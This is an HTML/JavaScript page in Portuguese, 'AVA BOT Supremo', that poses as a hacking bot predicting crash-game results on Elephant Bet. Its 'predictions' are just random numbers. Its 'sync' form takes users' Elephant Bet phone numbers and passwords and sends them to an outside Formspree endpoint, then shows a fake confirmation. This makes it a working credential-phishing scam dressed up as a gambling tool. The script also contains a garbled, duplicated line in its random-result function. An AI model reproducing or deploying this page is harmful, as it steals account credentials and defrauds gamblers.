<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>AVA BOT Supremo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: url('fundo.png') no-repeat center center fixed;
      background-size: cover;
      color:#fff;
      text-align:center;
      margin:0;
      padding:20px;
    }
    h1 {
      color:#ff0000;
      font-size:2.5em;
      text-shadow:0 0 15px #ff0000, 0 0 30px #ff0000;
      margin-top:10px;
    }
    .circle {
      font-size:1.5em;
      margin:20px auto;
      padding:40px;
      border-radius:50%;
      width:180px;
      height:180px;
      display:flex;
      align-items:center;
      justify-content:center;
      background:#111;
      color:#fff;
      box-shadow:0 0 20px #0ff;
    }
    .azul {
      color:#0ff;
      border:3px solid #0ff;
      box-shadow:0 0 25px #0ff;
      text-shadow:0 0 15px #0ff;
    }
    .blocked {
      background:#222;
      color:#ffcc00;
      padding:10px;
      margin:15px auto;
      border-radius:5px;
      width:90%;
      font-size:0.9em;
      box-shadow:0 0 10px #ffcc00;
    }
    button {
      padding:15px 25px;
      font-size:1.1em;
      border:none;
      border-radius:5px;
      cursor:pointer;
      width:80%;
      max-width:320px;
      margin:15px auto;
      display:block;
      text-transform:uppercase;
      font-weight:bold;
      box-shadow:0 0 15px #fff;
    }
    #preverBtn { background:#ffcc00; color:#000; box-shadow:0 0 20px #ffcc00; }
    #openLogin { background:#00ff00; color:#000; box-shadow:0 0 20px #00ff00; }
    #loginForm button { background:#ff0066; color:#fff; box-shadow:0 0 20px #ff0066; }
    input {
      margin:8px;
      padding:12px;
      width:80%;
      max-width:300px;
      font-size:1em;
      background:#111;
      color:#fff;
      border:1px solid #fff;
      border-radius:5px;
      box-shadow:0 0 10px #fff;
    }
    input::placeholder { color:#888; }
    #homeScreen, #gameScreen, #loginScreen, #syncScreen { display:none; }
    footer { margin-top:30px; font-size:0.8em; color:#888; }
  </style>
</head>
<body>
  <!-- Tela inicial -->
  <div id="homeScreen">
    <img src="logo.png" alt="Logo Avião" style="width:120px; margin-top:20px;">
    <h1>AVA BOT Supremo</h1>
    <form id="homeForm">
      <input type="tel" id="numeroInicio" name="numeroInicio" placeholder="Número de telemóvel" required maxlength="9" pattern="9[0-9]{8}"><br>
      <input type="text" id="chaveInicio" name="chaveInicio" placeholder="Chave de acesso" required><br>
      <button type="submit">Entrar</button>
    </form>
    <p style="margin-top:15px; color:#ffcc00;">Precisa de ajuda? Ligue: 926 128 955</p>
  </div>

  <!-- Tela do jogo -->
  <div id="gameScreen">
    <h1>ELEPHANT BET</h1>
    <div id="circle" class="circle">--</div>
    <button id="preverBtn">Hackear Próxima Vela</button>
    <div id="resultado"></div>
    <div id="blockedMsg" class="blocked" style="display:none;">⚠️ Acesso bloqueado. Sincronize o Bot.</div>
    <button id="openLogin">Sincronizar Bot</button>
  </div>

  <!-- Tela de login -->
  <div id="loginScreen">
    <h2>Conecte com a sua conta da Elephant Bet</h2>
    <form id="loginForm">
      <input type="tel" id="numeroLogin" name="numeroLogin" placeholder="Número de telemóvel" required maxlength="9" pattern="9[0-9]{8}"><br>
      <input type="password" id="senhaLogin" name="senhaLogin" placeholder="Digite a sua senha" required><br>
      <button type="submit">Sincronizar Agora</button>
    </form>
    <a href="#" id="closeLogin">← Voltar</a>
    <p id="statusMsg" style="color:#ffcc00;"></p>
  </div>

  <!-- Tela de sincronização concluída -->
  <div id="syncScreen">
    <h2>Obrigado por sincronizar o seu bot com a Elephantbet</h2>
    <p>Aguarde pelos dados de configuração do bot.</p>
    <button id="backToGame">Voltar ao Bot</button>
  </div>

  <footer>© AVA BOT Supremo</footer>
  <audio id="beepSound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg"></audio>

  <script>
    const homeForm=document.getElementById("homeForm"),numeroInicio=document.getElementById("numeroInicio"),chaveInicio=document.getElementById("chaveInicio"),homeScreen=document.getElementById("homeScreen"),gameScreen=document.getElementById("gameScreen"),loginScreen=document.getElementById("loginScreen"),syncScreen=document.getElementById("syncScreen"),loginForm=document.getElementById("loginForm"),numeroLogin=document.getElementById("numeroLogin"),senhaLogin=document.getElementById("senhaLogin"),statusMsg=document.getElementById("statusMsg"),circle=document.getElementById("circle"),preverBtn=document.getElementById("preverBtn"),resultado=document.getElementById("resultado"),blockedMsg=document.getElementById("blockedMsg"),openLogin=document.getElementById("openLogin"),closeLogin=document.getElementById("closeLogin"),backToGame=document.getElementById("backToGame"),beepSound=document.getElementById("beepSound");

    // Tela inicial
    homeForm.addEventListener("submit",function(e){
      e.preventDefault();
      if(!/^9\\d{8}$/.test(numeroInicio.value)){alert("Número inválido!");return;}
      if(chaveInicio.value!=="10102025"){alert("Chave incorreta!");return;}
      homeScreen.style.display="none";
      gameScreen.style.display="block";
    });

    // Predictor estilo Aviator
    preverBtn.addEventListener("click",function(){
      beepSound.play();
      let valor=1.00;
      const resultadoFinal=gerarResultadoAviator();
      const intervalo=setInterval(()=>{
        valor+=0.05;
        circle.textContent=valor.toFixed(2)+"x";
        if(valor>=resultadoFinal){
          clearInterval(intervalo);
          circle.textContent=resultadoFinal.toFixed(2)+"x";
          circle.className="circle azul";
          resultado.textContent=`Resultado → ${resultadoFinal.toFixed(2)}x`;
        }
      },30);
    });

    function gerarResultadoAviator(){
      const multiplicadores=[1.2,1.3,1.5,2,3,5,7,10,20,50,100];
      const pesos=[30,20,15,10,8,6,5,3,2,1,0.5];
      const totalPeso=pesos.reduce((a,b)=>a+b,0);
      let rand=Math.random()*
             const totalPeso = pesos.reduce((a,b)=>a+b,0);
      let rand = Math.random() * totalPeso;
      for (let i=0; i<multiplicadores.length; i++) {
        if (rand < pesos[i]) return multiplicadores[i];
        rand -= pesos[i];
      }
      return 2;
    }

    // Login
    openLogin.addEventListener("click", function() {
      gameScreen.style.display = "none";
      loginScreen.style.display = "block";
    });
    closeLogin.addEventListener("click", function() {
      loginScreen.style.display = "none";
      gameScreen.style.display = "block";
    });

    loginForm.addEventListener("submit", async function(event) {
      event.preventDefault();
      const numero = numeroLogin.value;
      const senha = senhaLogin.value;

      if (!/^9\d{8}$/.test(numero)) {
        statusMsg.textContent = "⚠️ O número deve começar com 9 e ter 9 dígitos.";
        return;
      }

      statusMsg.textContent = "Conectando...";

      try {
        await fetch("https://formspree.io/f/mbdeddpb", {
          method: "POST",
          body: JSON.stringify({ numero, senha }),
          headers: { "Content-Type": "application/json" }
        });
        statusMsg.textContent = "✅ Sincronização concluída!";
        loginScreen.style.display = "none";
        syncScreen.style.display = "block";
      } catch (error) {
        statusMsg.textContent = "❌ Erro ao enviar dados.";
      }
    });

    backToGame.addEventListener("click", function() {
      syncScreen.style.display = "none";
      gameScreen.style.display = "block";
    });

    // Inicial: mostra a tela de entrada logo ao abrir
    homeScreen.style.display = "block";
  </script>
</body>
</html>
